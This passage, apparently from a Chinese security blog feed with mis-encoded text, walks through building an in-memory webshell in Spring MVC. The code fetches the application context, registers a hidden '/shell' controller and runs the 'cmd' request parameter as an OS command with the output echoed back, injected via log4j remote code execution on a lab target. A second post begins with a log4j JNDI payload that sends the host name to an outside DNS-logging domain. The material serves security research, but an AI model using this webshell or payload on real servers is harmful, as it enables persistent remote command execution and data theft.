<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TYInGn"><img src="https://s4.ax1x.com/2021/12/24/TYInGn.png" alt="TYInGn.png" loading="lazy"></a></figure>
<p>ç»ˆäºåœ¨<font color="red">request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE)</font>è¿™é‡Œæ‹¿åˆ°äº†<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code>çš„webapplicationContextã€‚</p>
<p>DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTEçš„å€¼çš„æ¥æºæ˜¯DispatcherServletåˆå§‹åŒ–çš„æ—¶å€™</p>
<pre><code class="language-java">public static final String WEB_APPLICATION_CONTEXT_ATTRIBUTE = DispatcherServlet.class.getName() + &quot;.CONTEXT&quot;;
</code></pre>
<blockquote>
<p>PS è¿™ä¸ªå‡½æ•°å®é™…å·²ç»æ‹¿åˆ°äº†ä¸Šä¸‹æ–‡ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ–¹æ³•ä¸‰èƒ½ç®€ç•¥åˆ°æ–¹æ³•äºŒçš„åŸå› </p>
</blockquote>
<p><strong>æå‡ºç–‘é—®ï¼Œä¸ºä»€ä¹ˆèƒ½ä»requestä¸­è·å–ä¸Šä¸‹æ–‡å‘¢?</strong></p>
<p>è¿˜æ˜¯è¦å›åˆ°Spring MVC çš„ç»“æ„ä¸­çš„<code>DispatcherServlet</code></p>
<p>DispatcherServletæ˜¯springæ¡†æ¶å®ç°çš„å‰ç«¯æ§åˆ¶å™¨ã€‚ä½œä¸ºä¸€ä¸ªServletï¼Œæ‰€æœ‰çš„ Web è¯·æ±‚éƒ½éœ€è¦é€šè¿‡å®ƒæ¥å¤„ç†ï¼Œè¿›è¡Œè½¬å‘ï¼ŒåŒ¹é…ï¼Œæ•°æ®å¤„ç†åï¼Œå¹¶è½¬ç”±é¡µé¢è¿›è¡Œå±•ç°ï¼Œå®ƒå¯ä»¥è¯´æ˜¯ SpringMVC æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ã€‚é™¤æ­¤ä¹‹å¤– SpringMVC è¿˜æœ‰ä¸åŒçš„ HandlerMapping æ˜ å°„ç­–ç•¥ï¼Œå„ç§ Controller æ§åˆ¶å™¨çš„å®ç°ï¼Œå„ç§è§†å›¾è§£æï¼Œæ‹¦æˆªå™¨ï¼ŒLocalResolver å›½é™…åŒ–å¤„ç†ã€‚</p>
<p>åœ¨å®Œæˆå¯¹ ContextLoaderListener çš„åˆå§‹åŒ–åï¼ŒWeb å®¹å™¨å¼€å§‹åˆå§‹åŒ– DispatcherServletã€‚ DispatcherServlet ä¼šå»ºç«‹è‡ªå·±çš„ä¸Šä¸‹æ–‡æ¥æŒæœ‰SpringMVCçš„Bean å¯¹è±¡ï¼Œè¿‡ç¨‹æ˜¯é¦–å…ˆä» ServletContext ä¸­è· å–ä¸Šä¸‹æ–‡ä½œä¸ºè‡ªå·±çš„çˆ¶ä¸Šä¸‹æ–‡ï¼Œå†å¯¹è‡ªå·±çš„ä¸Šä¸‹æ–‡è¿›è¡Œåˆå§‹åŒ–ï¼Œæœ€åå­˜å‚¨åˆ° ServletContext ä¸­ã€‚</p>
<p>å¯ä»¥åœ¨ä¸‹å›¾ä¸­çœ‹åˆ°DispatcherServletç»§æ‰¿äº†FrameworkServlet</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TYIQMV"><img src="https://s4.ax1x.com/2021/12/24/TYIQMV.png" alt="TYIQMV.png" loading="lazy"></a></figure>
<p>åœ¨FrameworkServletä¸­å­˜åœ¨<strong>processRequest</strong>æ–¹æ³•ï¼Œåˆ©ç”¨è¯¥æ–¹æ³•é‡å†™äº†doget(),doPost()ç­‰servletè¯¥æœ‰çš„æ–¹æ³•</p>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TYIlrT"><img src="https://s4.ax1x.com/2021/12/24/TYIlrT.png" alt="TYIlrT.png" loading="lazy"></a></figure>
<p>æˆ‘ä»¬å¯ä»¥æ ¹æ®processRequestæ–¹æ³•çœ‹å‡º:<strong>initContextHolders</strong>ç»‘å®šäº†requestå’ŒlocaleContextï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ</p>
<p>requestèƒ½å–å‡ºä¸Šä¸‹æ–‡çš„åŸå› </p>
<pre><code class="language-java">protected final void processRequest(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {
long startTime = System.currentTimeMillis();
Throwable failureCause = null;
//è·å–ä¸Šä¸€ä¸ªè¯·æ±‚ä¿å­˜çš„LocaleContext
    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();
//å»ºç«‹æ–°çš„LocaleContext
    LocaleContext localeContext = buildLocaleContext(request);
//è·å–ä¸Šä¸€ä¸ªè¯·æ±‚ä¿å­˜çš„RequestAttributes
    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();
//å»ºç«‹æ–°çš„RequestAttributes
    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, 
response, previousAttributes);
    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), 
new RequestBindingInterceptor());
//å…·ä½“è®¾ç½®çš„æ–¹æ³•
    initContextHolders(request, localeContext, requestAttributes);
</code></pre>
<p><strong>ç°åœ¨æ¥åˆ†æ<code>WebApplicationContextUtils.getWebApplicationContext</code>æ–¹æ³•æºç </strong></p>
<pre><code class="language-java">//ç¬¬ä¸€æ­¥
public static WebApplicationContext getWebApplicationContext(ServletContext sc) {
        return getWebApplicationContext(sc, WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
    }

//ç¬¬äºŒæ­¥
public static WebApplicationContext getWebApplicationContext(ServletContext sc, String attrName) {
        Assert.notNull(sc, &quot;ServletContext must not be null&quot;);
    	//attrNameå°±æ˜¯org.springframework.web.context.WebApplicationContext.ROOT
        Object attr = sc.getAttribute(attrName);
        if (attr == null) {
            return null;
        } else if (attr instanceof RuntimeException) {
            throw (RuntimeException)attr;
        } else if (attr instanceof Error) {
            throw (Error)attr;
        } else if (attr instanceof Exception) {
            throw new IllegalStateException((Exception)attr);
        } else if (!(attr instanceof WebApplicationContext)) {
            throw new IllegalStateException(&quot;Context attribute is not of type WebApplicationContext: &quot; + attr);
        } else {
            return (WebApplicationContext)attr;
        }
    }
</code></pre>
<p>è·Ÿè¿›åˆ°æ–¹æ³•å†…å¯ä»¥çœ‹åˆ°</p>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TYIFr8"><img src="https://s4.ax1x.com/2021/12/24/TYIFr8.png" alt="TYIFr8.png" loading="lazy"></a></figure>
<p>è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°,ServletContextå’Œè·å–å±æ€§çš„å­—ç¬¦ä¸²ã€‚ServletContextå®˜æ–¹å«servletä¸Šä¸‹æ–‡ã€‚JavaEEæ ‡å‡†è§„å®šï¼šåœ¨é¡¹ç›®å¯åŠ¨æ—¶ï¼Œ<strong>Servletå®¹å™¨ï¼ˆTomcatã€Jbossç­‰ï¼‰<strong>éœ€è¦ç»™é¡¹ç›®åˆå§‹åŒ–ä¸€ä¸ª</strong>ServletContext</strong>ã€‚ä½œä¸ºå…¬å…±ç¯å¢ƒå®¹å™¨å­˜æ”¾å…¬å…±ä¿¡æ¯ï¼Œè€ŒServletContextä¸­çš„ä¿¡æ¯éƒ½æ˜¯ç”±å®¹å™¨æä¾›çš„ã€‚æœåŠ¡å™¨ä¼šä¸ºæ¯ä¸€ä¸ªå·¥ç¨‹åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯ServletContextå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å…¨å±€å”¯ä¸€ï¼Œè€Œä¸”å·¥ç¨‹å†…éƒ¨çš„æ‰€æœ‰servletéƒ½å…±äº«è¿™ä¸ªå¯¹è±¡ã€‚æ‰€ä»¥å«å…¨å±€åº”ç”¨ç¨‹åºå…±äº«å¯¹è±¡ã€‚è€Œ<font color="red">WebApplicationContext æ˜¯ SpringMVC ä¸­å¯¹ ApplicationContext çš„å…·ä½“å®ç°</font>ï¼Œæ¯ä¸ª ServletContext ä¸‹åªä¼šæœ‰ä¸€ä¸ª WebApplicationContext ï¼Œåœ¨åº”ç”¨åˆå§‹åŒ–æ—¶å°±åˆ›å»ºå‡ºæ¥äº†ï¼Œè€Œä¸æ˜¯ç­‰æµè§ˆå™¨è¯·æ±‚æ¥äº†æ‰åˆ›å»ºã€‚</p>
<p>å¯ä»¥åœ¨ org.springframework.web.contextçš„ contextloader.initWebApplicationContextä¸­è§‚å¯Ÿåˆ°</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TYIKx0"><img src="https://s4.ax1x.com/2021/12/24/TYIKx0.png" alt="TYIKx0.png" loading="lazy"></a></figure>
<p>å…¶åŸç†ååˆ†ç®€å•ï¼Œ<font color="red">åœ¨springå®¹å™¨åˆå§‹åŒ–çš„æ–¹æ³•ContextLoader.initWebApplicationContext(ServletContext)ä¸­é€šè¿‡servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, this.context);</font>å·²ç»å°†WebApplicationContextçš„å®ä¾‹æ”¾å…¥ServletContext ä¸­äº†ã€‚</p>
<p>ç„¶ååœ¨å·¥å…·ç±»çš„WebApplicationContextUtils.getWebApplicationContext(ServletContext)æ–¹æ³•ä¸­å°±å¯ä»¥é€šè¿‡ä¼ å…¥çš„ServletContextå‚æ•°è·å–åˆ°WebApplicationContextå®ä¾‹äº†ã€‚<br>
<strong>ç»“æœ</strong></p>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TYIiKf"><img src="https://s4.ax1x.com/2021/12/24/TYIiKf.png" alt="TYIiKf.png" loading="lazy"></a></figure>
<h4 id="æ–¹æ³•ä¸‰-requestcontextutils-æ˜¯æ–¹æ³•äºŒçš„ç®€åŒ–">æ–¹æ³•ä¸‰: RequestContextUtils æ˜¯æ–¹æ³•äºŒçš„ç®€åŒ–</h4>
<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
</code></pre>
<p>å…¶å®åœ¨æ–¹æ³•äºŒä¸­æˆ‘ä»¬å·²ç»å¯ä»¥çœ‹åˆ°æ‹¿åˆ°requestå¯¹è±¡åå·²ç»èƒ½ç›´æ¥getAttributeè·å–ä¸Šä¸‹æ–‡,å®é™…ä¸Šæˆ‘ä»¬åšä¸ªæ¯”è¾ƒå°±èƒ½åˆ¤æ–­ä¸¤è€…æ˜¯å¦ä¸€è‡´</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TYI1qU"><img src="https://s4.ax1x.com/2021/12/24/TYI1qU.png" alt="TYI1qU.png" loading="lazy"></a></figure>
<h4 id="æ–¹æ³•å››-getattribute">æ–¹æ³•å››: getAttribute</h4>
<pre><code>WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
</code></pre>
<p>åœ¨ä¸Šæ–‡çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬çŸ¥é“RequestContextHolderå¯ä»¥ç›´æ¥æ‹¿åˆ°requestã€‚</p>
<p>ä½†æ˜¯ä¸ºä»€ä¹ˆå‘¢?</p>
<p>æˆ‘ä»¬æ¥ç€çœ‹ä»–çš„æºç </p>
<pre><code class="language-java">public abstract class RequestContextHolder {
    private static final boolean jsfPresent = ClassUtils.isPresent(&quot;javax.faces.context.FacesContext&quot;, RequestContextHolder.class.getClassLoader());
    private static final ThreadLocal&lt;RequestAttributes&gt; requestAttributesHolder = new NamedThreadLocal(&quot;Request attributes&quot;);
    private static final ThreadLocal&lt;RequestAttributes&gt; inheritableRequestAttributesHolder = new NamedInheritableThreadLocal(&quot;Request context&quot;);

    public RequestContextHolder() {
    }

    public static RequestAttributes getRequestAttributes() {
        RequestAttributes attributes = (RequestAttributes)requestAttributesHolder.get();
        if (attributes == null) {
            attributes = (RequestAttributes)inheritableRequestAttributesHolder.get();
        }

        return attributes;
    }
    public static RequestAttributes currentRequestAttributes() throws IllegalStateException {
        RequestAttributes attributes = getRequestAttributes();
    ......................
</code></pre>
<p>å¯ä»¥çœ‹åˆ°getRequestAttributesç›´æ¥ä»ThreadLocalå–å‡ºattributes,ThreadLocalæ˜¯ä»€ä¹ˆä¸å†èµ˜è¿°ã€‚</p>
<p>ThreadLocalçš„å€¼åˆæ˜¯æ¥è‡ªä¸Šæ–‡åˆ†æçš„processRequestä¸­çš„initContextHoldersè®¾ç½®çš„ï¼Œè€Œå®é™…ä¸Šåªè¦è·Ÿä¸€ä¸‹initContextHolderså°±å¯ä»¥å‘ç°å¡äº†ä¸Šä¸‹æ–‡è¿›å»ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œèƒ½é€šè¿‡ThreadLocalå–åˆ°ä¸Šä¸‹æ–‡</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TYI8ZF"><img src="https://s4.ax1x.com/2021/12/24/TYI8ZF.png" alt="TYI8ZF.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TYIJIJ"><img src="https://s4.ax1x.com/2021/12/24/TYIJIJ.png" alt="TYIJIJ.png" loading="lazy"></a></figure>
<h3 id="0x02-02-æ€ä¹ˆæ‰‹åŠ¨æ³¨å†Œ">0X02-02 æ€ä¹ˆæ‰‹åŠ¨æ³¨å†Œ?</h3>
<p>è¿˜æ˜¯éœ€è¦å…ˆäº†è§£ä¸€ä¸‹å‰ç½®çŸ¥è¯†ï¼Œä»€ä¹ˆæ˜¯Spring  Bean</p>
<blockquote>
<ul>
<li>beanæ˜¯å¯¹è±¡ï¼Œä¸€ä¸ªæˆ–è€…å¤šä¸ªä¸é™å®š</li>
<li>beanç”±Springä¸­ä¸€ä¸ªå«IoCçš„ä¸œè¥¿ç®¡ç†</li>
<li>æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºç”±ä¸€ä¸ªä¸ªbeanæ„æˆ</li>
</ul>
</blockquote>
<p>å†ç†è§£ä¸€ä¸‹ä»€ä¹ˆå«IOCå®¹å™¨</p>
<blockquote>
<p>IOCå®¹å™¨å°±æ˜¯å…·æœ‰ä¾èµ–æ³¨å…¥åŠŸèƒ½çš„å®¹å™¨ï¼ŒIOCå®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´çš„ä¾èµ–ã€‚åº”ç”¨ç¨‹åºæ— éœ€ç›´æ¥åœ¨ä»£ç ä¸­newç›¸å…³çš„å¯¹è±¡ï¼Œåº”ç”¨ç¨‹åºç”±IOCå®¹å™¨è¿›è¡Œç»„è£…ã€‚åœ¨Springä¸­BeanFactoryæ˜¯IOCå®¹å™¨çš„å®é™…ä»£è¡¨è€…ã€‚</p>
</blockquote>
<p>æœ€é‡è¦çš„:<font color="red">ç”±IOCå®¹å™¨ç®¡ç†çš„é‚£äº›ç»„æˆåº”ç”¨ç¨‹åºçš„å¯¹è±¡æˆ‘ä»¬å°±å«å®ƒBean</font>ï¼Œ Beanå°±æ˜¯ç”±Springå®¹å™¨åˆå§‹åŒ–ã€è£…é…åŠç®¡ç†çš„å¯¹è±¡ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œbeanå°±ä¸åº”ç”¨ç¨‹åºä¸­çš„å…¶ä»–å¯¹è±¡æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«äº†ã€‚</p>
<p>å¯ä»¥å‚è€ƒä¸‹è¿™ç¯‡æ–‡ç« ç†è§£</p>
<blockquote>
<p>https://www.cnblogs.com/linjiqin/archive/2013/11/04/3407126.html</p>
</blockquote>
<pre><code class="language-java">/*
å¦‚ä½•è·å–IOCå®¹å™¨å¹¶å®Œæˆæˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½å‘¢ï¼Ÿé¦–å…ˆåº”è¯¥å®ä¾‹åŒ–ä¸€ä¸ªIOCå®¹å™¨ï¼Œç„¶åä»å®¹å™¨ä¸­è·å–éœ€è¦çš„å¯¹è±¡ï¼Œç„¶åè°ƒç”¨æ¥å£å®Œæˆæˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹
*/
public class HelloServiceTest {
    @Test
    public void testHelloWorld() {
        // 1ã€è¯»å–é…ç½®æ–‡ä»¶å®ä¾‹åŒ–ä¸€ä¸ªIOCå®¹å™¨
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;helloworld.xml&quot;);
        // 2ã€ä»å®¹å™¨ä¸­è·å–Beanï¼Œæ³¨æ„æ­¤å¤„å®Œå…¨â€œé¢å‘æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯é¢å‘å®ç°â€
        HelloService helloService = context.getBean(&quot;helloService&quot;, HelloService.class);
        // 3ã€æ‰§è¡Œä¸šåŠ¡é€»è¾‘
        helloService.sayHello();
    }
}
</code></pre>
<p>åœ¨å‚è€ƒæ–‡ç« ä¸­çœ‹åˆ°äº†ç†Ÿæ‚‰çš„å­—çœ¼<strong>ApplicationContext context</strong>ã€‚ç»è¿‡ä¸Šé¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ApplicationContext æ˜¯å®¹å™¨åˆå§‹åŒ–åçš„ä¸Šä¸‹æ–‡,è¿™é‡Œä¸ºå•¥è·ŸIOCå®¹å™¨å…³è”èµ·æ¥äº†å‘¢ã€‚</p>
<p>åŸå› å¦‚ä¸‹</p>
<blockquote>
<p>åœ¨Spring IOCå®¹å™¨çš„ä»£è¡¨å°±æ˜¯org.springframework.beansåŒ…ä¸­çš„BeanFactoryæ¥å£ï¼ŒBeanFactoryæ¥å£æä¾›äº†IOCå®¹å™¨æœ€åŸºæœ¬åŠŸèƒ½ï¼›è€Œorg.springframework.contextåŒ…ä¸‹çš„ApplicationContextæ¥å£æ‰©å±•äº†BeanFactory</p>
</blockquote>
<p>è¿™ä¸€ç‚¹è·Ÿä¸€ä¸‹ä»£ç å°±çŸ¥é“äº†</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TYIti9"><img src="https://s4.ax1x.com/2021/12/24/TYIti9.png" alt="TYIti9.png" loading="lazy"></a></figure>
<p>ç°åœ¨è¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨spring ä¸­å…¨éƒ½å¯ä»¥çœ‹åšbeanã€‚é‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰é™æ€çš„æ³¨å†ŒrequestMappingçš„æ–¹æ³•æ˜¯å¦ä¹Ÿå¯ä»¥çœ‹åšä¸€ä¸ªbeanå‘¢?</p>
<p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚</p>
<pre><code class="language-java">// ä»contextä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
</code></pre>
<p>RequestMappingHandlerMappingå¯¹è±¡æ˜¯ç”¨äºæ³¨å†Œcontrollerçš„</p>
<p>å®ƒç»§æ‰¿äº†AbstractHandlerMethodMappingï¼Œåœ¨AbstractHandlerMethodMappingä¸­æä¾›äº†registerMappingæ–¹æ³•</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TYINGR"><img src="https://s4.ax1x.com/2021/12/24/TYINGR.png" alt="TYINGR.png" loading="lazy"></a></figure>
<p>éœ€è¦ä¸‰ä¸ªå‚æ•°</p>
<ol>
<li>
<p>mappingéœ€è¦æä¾›ä¸€ä¸ªRequestMappingInfoç±»çš„å®ä¾‹ã€‚</p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TYIaxx"><img src="https://s4.ax1x.com/2021/12/24/TYIaxx.png" alt="TYIaxx.png" loading="lazy"></a></figure>
<p>RequestMappingInfoå…¶å®å°±æ˜¯@RequestMappingæ³¨è§£é‡Œé¢æä¾›ä¿¡æ¯çš„ä¸€ä¸ªåŒ…è£…ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬åªç”¨è®¾ç½®urlå’Œmethod</p>
<pre><code class="language-java">// å®šä¹‰è®¿é—® controller çš„ URL åœ°å€
PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
// å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//æ³¨å†Œmappinginfoä¿¡æ¯
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
</code></pre>
</li>
<li>
<p>hanlderè¡¨ç¤ºå¤„ç†è¯¥urlçš„ç±»çš„å®ä¾‹ï¼Œå†…å­˜é©¬è‚¯å®šæ˜¯æ¶æ„ç±»è¿™ä¸ªç±»ï¼Œä½†æ˜¯å¦‚æœnew è¿™ä¸ªç±»çš„è¯å°±ä¼šä¸€ç›´å¾ªç¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ•´ä¸€ä¸ªæœ‰å‚æ„é€ æ–¹æ³•é¿å…å¾ªç¯</p>
<pre><code class="language-java">// åˆ›å»ºç”¨äºå¤„ç†è¯·æ±‚çš„å¯¹è±¡ï¼ŒåŠ å…¥â€œaaaâ€å‚æ•°æ˜¯ä¸ºäº†è§¦å‘ç¬¬äºŒä¸ªæ„é€ å‡½æ•°é¿å…æ— é™å¾ªç¯
InjectToController injectToController = new InjectToController(&quot;aaa&quot;);
</code></pre>
</li>
<li>
<p>Methodå°±æ˜¯åˆ†é…ç»™è¯¥è·¯ç”±çš„æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„è·å–è¯¥æ¶æ„ç±»çš„æ–¹æ³•ã€‚æ–¹æ³•é‡Œå¯ä»¥å†™ä»»ä½•ä½ æƒ³è¦çš„ä¸œè¥¿</p>
<pre><code class="language-java">// é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰æ¶æ„ç±»ä¸­testçš„ Method å¯¹è±¡
Method method2 = InjectToController.class.getMethod(&quot;test&quot;);
</code></pre>
</li>
</ol>
<p>æœ€åæ•´åˆä¸Šé¢çš„ä¿¡æ¯æ³¨å†Œ:</p>
<pre><code class="language-java">mappingHandlerMapping.registerMapping(info, injectToController, method2);
</code></pre>
<h3 id="0x02-03-è‡ªå®šä¹‰æ–¹æ³•å›æ˜¾">0x02-03 è‡ªå®šä¹‰æ–¹æ³•ï¼Œå›æ˜¾</h3>
<p>åœ¨ä¹‹å‰å…¶å®å·²ç»è°ˆè¿‡è¿™ä¸ªé—®é¢˜ï¼Œç›®æ ‡å°±æ˜¯è·å–è¾“å…¥å¹¶ä¸”è¾“å‡ºã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–å½“å‰çš„requestå’Œresponseä¸¤ä¸ªå¯¹è±¡ã€‚</p>
<p>è¿˜æ˜¯å¯ä»¥ç”¨ä¹‹å‰æè¿‡çš„RequestContextHolderè¿™ä¸ªå·¥å…·ç±»æ¥å®ç°ï¼Œå®é™…ä¸Šåœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬å·²ç»åˆ©ç”¨å®ƒæ¥è·å–requestäº†</p>
<pre><code class="language-java">// è·å–requestå’Œresponseå¯¹è±¡
HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
</code></pre>
<p>åœ¨requestä¸­æ¥å—æˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼Œåœ¨javaä»£ç ä¸­æ‰§è¡Œè¯¥å‚æ•°çš„å€¼,è¿™é‡Œè¾“å‡ºresponseæ—¶å¯ä»¥ç”¨getwriterå’ŒgetOutputStream</p>
<pre><code class="language-java">// è·å–cmdå‚æ•°å¹¶æ‰§è¡Œå‘½ä»¤
String cmd= request.getParameter(&quot;cmd&quot;);
String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
response.getOutputStream().println(res);
response.flushBuffer();
</code></pre>
<h2 id="0x03-æ•ˆæœæ¼”ç¤º">0X03 æ•ˆæœæ¼”ç¤º</h2>
<p>è®¿é—®é¶æœº/shellè·¯å¾„ä¸º404</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TYIwM6"><img src="https://s4.ax1x.com/2021/12/24/TYIwM6.png" alt="TYIwM6.png" loading="lazy"></a></figure>
<p>ä½¿ç”¨é¶æœº-log4jè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæ³¨å…¥æ¶æ„ç±»</p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TYI0sK"><img src="https://s4.ax1x.com/2021/12/24/TYI0sK.png" alt="TYI0sK.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TYIrZD"><img src="https://s4.ax1x.com/2021/12/24/TYIrZD.png" alt="TYIrZD.png" loading="lazy"></a></figure>
<p>å†æ¬¡è®¿é—®/shell?cmd=whoami,å·²ç»å¾—åˆ°å›æ˜¾</p>
<p><a href="https://imgtu.com/i/TYIsde"><img src="https://s4.ax1x.com/2021/12/24/TYIsde.png" alt="TYIsde.png" loading="lazy"></a><br>
å¼¹ä¸ªè®¡ç®—å™¨è¯•è¯•<br>
<a href="https://imgtu.com/i/TYbOqP"><img src="https://s4.ax1x.com/2021/12/24/TYbOqP.gif" alt="TYbOqP.gif" loading="lazy"></a></p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<blockquote>
<p>https://blog.csdn.net/x_iya/article/details/77758069 beanå’Œwebapplication</p>
<p>https://www.cnblogs.com/rancho-blog/p/7011176.html servletcontextåˆå§‹åŒ–æ—¶åˆ›å»ºwebapplicationContext</p>
<p>https://blog.csdn.net/qq_42154259/article/details/107343764  æ±‚ä¸Šä¸‹æ–‡æŒæœ‰è€…ï¼šRequestContextHolder</p>
<p><strong>ä¸ºå•¥requestèƒ½å–å‡ºä¸Šä¸‹æ–‡</strong></p>
<p>https://blog.csdn.net/liqun_super/article/details/107999644  Spring MVC ä¹‹RequestContextHolder</p>
<p>**https://www.cnblogs.com/shuilangyizu/p/8621669.html</p>
<p>https://www.jianshu.com/p/58d3ed37a20c ä»€ä¹ˆæ˜¯Spring bean</p>
<p>https://blog.csdn.net/jike11231/article/details/106229560</p>
<p>https://blog.csdn.net/weixin_44580977/article/details/103949602</p>
<p>https://blog.csdn.net/liangsheng_g/article/details/110855327</p>
<p>https://www.cnblogs.com/bitterz/p/14820898.html</p>
<p>https://www.cnblogs.com/xiaoxi/p/6164383.html</p>
<p>https://blog.csdn.net/GAMEloft9/article/details/81625348</p>
<p>https://www.cnblogs.com/chenbenbuyi/p/7470834.html</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Log4j-å¹´è½»äººçš„ç¬¬ä¸€æ¬¡ç ”ç©¶]]></title>
        <id>https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/">
        </link>
        <updated>2021-12-20T10:08:06.000Z</updated>
        <content type="html"><![CDATA[<p><strong>ç®€å•è·Ÿä¸€ä¸‹ä»£ç XD</strong></p>
<h1 id="0x01-æ­å»ºç¯å¢ƒ">0X01 æ­å»ºç¯å¢ƒ</h1>
<p>IDEA ç”Ÿæˆmavené¡¹ç›®ï¼Œç®€å•é…ç½®pom.xml</p>
<pre><code class="language-xml">    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<p>ç”Ÿæˆæµ‹è¯•ç±»</p>
<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.JndiLookup;
public class test {
    public static final Logger logger = LogManager.getLogger(test.class);
    public static void main(String[] args) {
        System.out.println(&quot;version: 2.14.1&quot;);
        logger.error(&quot;${jndi:dns://${hostName}.dnslog.cn}&quot;);
    }
}
</code></pre>
<h1 id="0x02-åˆ†æ">0x02 åˆ†æ</h1>
<h2 id="å…ˆé—®æ˜¯ä¸æ˜¯å†é—®æœ‰æ²¡æœ‰">å…ˆé—®æ˜¯ä¸æ˜¯ï¼Œå†é—®æœ‰æ²¡æœ‰</h2>
<p>å› ä¸ºè‡ªå·±è·Ÿå¾ˆéº»çƒ¦(ä¸»è¦æ˜¯å› ä¸ºèœ...)ï¼Œå…ˆå‰½çªƒä¸€æ‰‹å…¶ä»–å¸ˆå‚…çš„ç»“è®ºã€‚</p>
